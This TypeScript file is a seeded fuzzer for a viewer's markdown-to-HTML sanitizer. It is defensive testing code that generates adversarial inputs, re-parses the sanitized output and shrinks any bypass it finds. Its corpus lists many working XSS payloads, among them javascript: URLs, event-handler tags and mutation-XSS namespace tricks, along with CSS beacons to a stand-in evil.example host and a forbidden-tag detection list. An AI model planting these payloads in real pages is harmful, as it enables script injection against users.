/**
 * Property-based fuzzer for the rendered-markdown sanitization boundary.
 *
 * The viewer inserts `sanitizeRenderedHtml(renderMarkdown(text))` into the DOM
 * via `dangerouslySetInnerHTML`. Transcript fields are attacker-controlled, so
 * that boundary must never emit a script-execution or navigation vector. This
 * module generates adversarial markdown/MathJax/HTML, runs it through the real
 * pipeline, and re-parses the output the same way the browser does to detect
 * anything dangerous that survived.
 *
 * Not a test framework file on purpose — the vitest wrapper drives it, and it
 * can also be run standalone. Uses a seeded RNG so every failure replays from
 * its seed.
 */

import { renderMarkdown, type MarkdownRenderer } from "./markdownRendering";
import { sanitizeRenderedHtml } from "./renderedHtmlSanitizer";

// Tags the sanitizer intends to strip; any survivor is a bypass.
const FORBIDDEN_TAGS = new Set([
  "animate",
  "animatemotion",
  "animatetransform",
  "audio",
  "base",
  "button",
  "discard",
  "embed",
  "foreignobject",
  "form",
  "iframe",
  "image",
  "img",
  "input",
  "link",
  "meta",
  "mpath",
  "object",
  "picture",
  "script",
  "select",
  "set",
  "source",
  "textarea",
  "track",
  "video",
]);

const URL_ATTRIBUTES = new Set([
  "action",
  "background",
  "formaction",
  "href",
  "poster",
  "src",
  "srcset",
  "xlink:href",
]);

const UNSAFE_CSS_PATTERN =
  /@import|behavior\s*:|binding\s*:|expression\s*\(|javascript\s*:|vbscript\s*:|url\s*\(/i;

export type FuzzMode = "markdown" | "fragment" | "html";

export interface Violation {
  kind:
    | "event-handler"
    | "forbidden-tag"
    | "dangerous-url"
    | "unsafe-style-attr"
    | "unsafe-style-element"
    | "srcdoc";
  detail: string;
}

export interface EvalResult {
  sanitized: string;
  violations: Violation[];
}

// Mirror the sanitizer's own URL normalization so the oracle judges what the
// browser would actually resolve (control chars + whitespace are ignored by
// URL parsers, so `java\tscript:` executes just like `javascript:`).
const normalizeUrl = (value: string): string =>
  Array.from(value)
    .filter((char) => {
      const code = char.charCodeAt(0);
      return code > 0x1f && code !== 0x7f && !/\s/.test(char);
    })
    .join("")
    .toLowerCase();

const isDangerousUrl = (value: string): boolean =>
  /^(?:javascript|vbscript|data):/.test(normalizeUrl(value));

/**
 * Re-parse sanitized HTML exactly as `dangerouslySetInnerHTML` does (assign to
 * `innerHTML` in an HTML context) and report every surviving XSS sink. Parsing
 * here — rather than string-matching — is what makes the oracle catch mutation
 * XSS: if the browser's reparse resurrects a handler or tag, we see it.
 */
export const findXssViolations = (html: string): Violation[] => {
  const container = document.createElement("div");
  container.innerHTML = html;

  const violations: Violation[] = [];
  for (const el of Array.from(container.querySelectorAll("*"))) {
    const tag = el.tagName.toLowerCase();

    if (FORBIDDEN_TAGS.has(tag)) {
      violations.push({ kind: "forbidden-tag", detail: tag });
    }

    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value;

      if (name.startsWith("on")) {
        violations.push({ kind: "event-handler", detail: `${tag}[${name}]` });
      } else if (name === "srcdoc") {
        violations.push({ kind: "srcdoc", detail: tag });
      } else if (URL_ATTRIBUTES.has(name) && isDangerousUrl(value)) {
        violations.push({
          kind: "dangerous-url",
          detail: `${tag}[${name}]=${value.slice(0, 80)}`,
        });
      } else if (name === "style" && UNSAFE_CSS_PATTERN.test(value)) {
        violations.push({
          kind: "unsafe-style-attr",
          detail: value.slice(0, 80),
        });
      }
    }

    if (tag === "style" && UNSAFE_CSS_PATTERN.test(el.textContent ?? "")) {
      violations.push({
        kind: "unsafe-style-element",
        detail: (el.textContent ?? "").slice(0, 80),
      });
    }
  }

  return violations;
};

export const evaluateInput = (mode: FuzzMode, input: string): EvalResult => {
  let sanitized: string;
  if (mode === "html") {
    sanitized = sanitizeRenderedHtml(input);
  } else {
    const renderer: MarkdownRenderer =
      mode === "fragment" ? "fragment" : "full";
    sanitized = sanitizeRenderedHtml(renderMarkdown(input, renderer));
  }
  return { sanitized, violations: findXssViolations(sanitized) };
};

// ---------------------------------------------------------------------------
// Seeded RNG (mulberry32) — deterministic so a failing seed replays exactly.
// ---------------------------------------------------------------------------

const mulberry32 = (seed: number): (() => number) => {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
};

const pick = <T>(rng: () => number, items: readonly T[]): T =>
  items[Math.floor(rng() * items.length)] as T;

// ---------------------------------------------------------------------------
// Adversarial corpus.
// ---------------------------------------------------------------------------

// Dangerous URL values, dropped into href/src slots by wrappers.
const DANGEROUS_URLS = [
  "javascript:alert(1)",
  "jAvAsCrIpT:alert(1)",
  "java\tscript:alert(1)",
  "java\nscript:alert(1)",
  "  javascript:alert(1)",
  "\u0000javascript:alert(1)",
  "javascript&colon;alert(1)",
  "vbscript:msgbox(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
];

// Fragments that are live XSS if they survive as markup.
const HTML_PAYLOADS = [
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)></svg>",
  "<svg><animate onbegin=alert(1)></svg>",
  "<a href=# onclick=alert(1)>x</a>",
  "<div onpointerover=alert(1)>x</div>",
  "<input autofocus onfocus=alert(1)>",
  "<video><source onerror=alert(1)></video>",
  "<iframe src=javascript:alert(1)></iframe>",
  "<object data=javascript:alert(1)></object>",
  "<base href=javascript:alert(1)//>",
  "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
  "<form><button formaction=javascript:alert(1)>x</button></form>",
  "<a href=x style=background:url(javascript:alert(1))>x</a>",
  // Namespace-confusion / mutation-XSS classics. The sanitizer allows <style>
  // conditionally and enables HTML+MathML+SVG profiles together — historically
  // the exact combination that reopens mXSS holes, so stress it hard.
  "<math><mtext><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>",
  "<svg><foreignObject><a href=javascript:alert(1)>x</a></foreignObject></svg>",
  "<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></mglyph></table></mtext></math>",
  '<svg></p><style><a id="</style><img src=x onerror=alert(1)>">',
  '<math><annotation-xml encoding="text/html"><iframe src=javascript:alert(1)></iframe></annotation-xml></math>',
  "<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>",
  "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
  '<style>@import"https://evil.example/x.css";</style>',
  "<style>x{background:url(https://evil.example/beacon)}</style>",
  '<span id="mjx-deadbeef"><style>#mjx-deadbeef{background:url(https://evil.example/beacon)}</style></span>',
  '<span id="mjx-deadbeef"><style>#mjx-deadbeef{}</style><img src=x onerror=alert(1)></span>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<template><img src=x onerror=alert(1)></template>",
  "<xmp><img src=x onerror=alert(1)></xmp>",
  "<listing><img src=x onerror=alert(1)></listing>",
  "<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></svg>",
  "<svg><title><style><a xlink:href=javascript:alert(1)></style></title></svg>",
];

// LaTeX/MathJax payloads. `URL` is substituted with a dangerous URL.
const LATEX_PAYLOADS = [
  "\\href{URL}{z}",
  '\\href{x"><animate onbegin=alert(1)>}{z}',
  '\\href{x" onmouseover="alert(1)}{z}',
  "\\href{URL}{\\text{click}}",
  "\\class{c}{\\href{URL}{z}}",
  "\\cssId{i}{\\href{URL}{z}}",
  "\\style{background:url(URL)}{z}",
  "\\unicode{x41}\\href{URL}{z}",
];

// Entity-encoded payloads that target the pipeline's post-render unescaping
// (unescapeCodeHtmlEntities / unescapeSupHtmlEntities / unprotectMarkdown).
const ENTITY_PAYLOADS = [
  "&lt;img src=x onerror=alert(1)&gt;",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;svg onload=alert(1)&#62;",
  "&#x3c;img src=x onerror=alert(1)&#x3e;",
  "&lt;sup&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/sup&gt;",
];

// Sequences that break out of attribute/tag contexts.
const BREAKOUTS = [
  '">',
  "'>",
  '"><',
  "</",
  "<!--",
  "-->",
  "<![CDATA[",
  "]]>",
  "\u0000",
  "`",
  "&NewLine;",
  "&Tab;",
  "&colon;",
  "&#0;",
];

const withUrl = (rng: () => number, payload: string): string =>
  payload.replace(/URL/g, () => pick(rng, DANGEROUS_URLS));

const upperMaybe = (rng: () => number, s: string): string =>
  rng() < 0.15 ? s.toUpperCase() : s;

const spliceBreakout = (rng: () => number, s: string): string => {
  if (rng() < 0.6 || s.length === 0) {
    return s;
  }
  const at = Math.floor(rng() * s.length);
  return s.slice(0, at) + pick(rng, BREAKOUTS) + s.slice(at);
};

type Wrapper = (rng: () => number, fragment: string) => string;

const WRAPPERS: Wrapper[] = [
  (_r, f) => f,
  (_r, f) => `$${f}$`,
  (_r, f) => `$$${f}$$`,
  (_r, f) => `[link](${f})`,
  (_r, f) => `![alt](${f})`,
  (_r, f) => `\`${f}\``,
  (_r, f) => `\n\n\`\`\`\n${f}\n\`\`\`\n\n`,
  (_r, f) => `<code>${f}</code>`,
  (_r, f) => `<sup>${f}</sup>`,
  (_r, f) => `> ${f}`,
  (_r, f) => `- ${f}`,
  (_r, f) => `[ref]: ${f}`,
];

const PAYLOAD_SOURCES = [
  (rng: () => number) => withUrl(rng, pick(rng, HTML_PAYLOADS)),
  (rng: () => number) => withUrl(rng, pick(rng, LATEX_PAYLOADS)),
  (rng: () => number) => pick(rng, ENTITY_PAYLOADS),
  (rng: () => number) => pick(rng, DANGEROUS_URLS),
];

const makeFragment = (rng: () => number): string => {
  const payload = pick(rng, PAYLOAD_SOURCES)(rng);
  const wrapped = pick(rng, WRAPPERS)(rng, payload);
  return spliceBreakout(rng, upperMaybe(rng, wrapped));
};

export interface FuzzInput {
  mode: FuzzMode;
  input: string;
}

export const generateInput = (rng: () => number): FuzzInput => {
  const modeRoll = rng();
  const mode: FuzzMode =
    modeRoll < 0.55 ? "markdown" : modeRoll < 0.75 ? "fragment" : "html";

  const count = 1 + Math.floor(rng() * 4);
  const fragments: string[] = [];
  for (let i = 0; i < count; i++) {
    fragments.push(makeFragment(rng));
  }

  const separator = mode === "html" ? "" : pick(rng, ["\n\n", "\n", " ", ""]);
  return { mode, input: fragments.join(separator) };
};

// ---------------------------------------------------------------------------
// A finding is either an XSS bypass (something dangerous survived) or a thrown
// exception. A sanitizer that throws is itself a defect: callers treat it as
// total (it feeds `dangerouslySetInnerHTML`), so a throw becomes a render
// crash / failed-to-display rather than safe output.
// ---------------------------------------------------------------------------

export type FindingKind = "xss" | "sanitizer-threw";

interface CheckResult {
  kind: FindingKind | "ok";
  violations: Violation[];
  error?: string;
}

const check = (mode: FuzzMode, input: string): CheckResult => {
  try {
    const { violations } = evaluateInput(mode, input);
    return violations.length > 0
      ? { kind: "xss", violations }
      : { kind: "ok", violations: [] };
  } catch (e) {
    return {
      kind: "sanitizer-threw",
      violations: [],
      error: e instanceof Error ? e.message : String(e),
    };
  }
};

// ---------------------------------------------------------------------------
// Shrinking (ddmin-style): reduce a failing input while it still fails the
// SAME way (same finding kind), so the minimal repro reproduces the finding.
// ---------------------------------------------------------------------------

const stillFails = (
  mode: FuzzMode,
  input: string,
  kind: FindingKind
): boolean => {
  if (!input) {
    return false;
  }
  return check(mode, input).kind === kind;
};

export const shrink = (
  mode: FuzzMode,
  input: string,
  kind: FindingKind
): string => {
  let current = input;
  let improved = true;

  while (improved) {
    improved = false;
    let chunk = Math.max(1, Math.floor(current.length / 2));
    while (chunk >= 1) {
      let i = 0;
      while (i < current.length) {
        const candidate = current.slice(0, i) + current.slice(i + chunk);
        if (stillFails(mode, candidate, kind)) {
          current = candidate;
          improved = true;
        } else {
          i += chunk;
        }
      }
      chunk = Math.floor(chunk / 2);
    }
  }

  return current;
};

export interface FuzzFinding {
  kind: FindingKind;
  seed: number;
  iteration: number;
  mode: FuzzMode;
  input: string;
  minimal: string;
  sanitized?: string;
  violations: Violation[];
  error?: string;
}

export interface FuzzOptions {
  iterations: number;
  seed: number;
  /** Which finding kinds to report. Defaults to both. */
  kinds?: readonly FindingKind[];
}

/** Run the fuzzer and return the first failing input (shrunk), or null. */
export const runFuzzer = (options: FuzzOptions): FuzzFinding | null => {
  const { iterations, seed } = options;
  const kinds = new Set<FindingKind>(
    options.kinds ?? ["xss", "sanitizer-threw"]
  );

  for (let i = 0; i < iterations; i++) {
    const iterSeed = (seed + i) >>> 0;
    const rng = mulberry32(iterSeed);
    const { mode, input } = generateInput(rng);

    const result = check(mode, input);
    if (result.kind === "ok" || !kinds.has(result.kind)) {
      continue;
    }

    const minimal = shrink(mode, input, result.kind);
    const minimalResult = check(mode, minimal);
    return {
      kind: result.kind,
      seed: iterSeed,
      iteration: i,
      mode,
      input,
      minimal,
      sanitized:
        result.kind === "xss"
          ? evaluateInput(mode, minimal).sanitized
          : undefined,
      violations: minimalResult.violations,
      error: minimalResult.error,
    };
  }

  return null;
};

export const formatFinding = (finding: FuzzFinding): string => {
  const header =
    finding.kind === "xss"
      ? "XSS sanitization bypass found by fuzzer"
      : "sanitizeRenderedHtml threw instead of returning sanitized HTML";
  const lines = [
    header,
    `  seed:       ${finding.seed} (replay: FUZZ_SEED=${finding.seed} FUZZ_ITERATIONS=1)`,
    `  mode:       ${finding.mode}`,
    `  input:      ${JSON.stringify(finding.input)}`,
    `  minimal:    ${JSON.stringify(finding.minimal)}`,
  ];
  if (finding.kind === "xss") {
    lines.push(`  sanitized:  ${JSON.stringify(finding.sanitized)}`);
    lines.push("  violations:");
    lines.push(
      ...finding.violations.map((v) => `    - ${v.kind}: ${v.detail}`)
    );
  } else {
    lines.push(`  error:      ${finding.error}`);
  }
  return lines.join("\n");
};
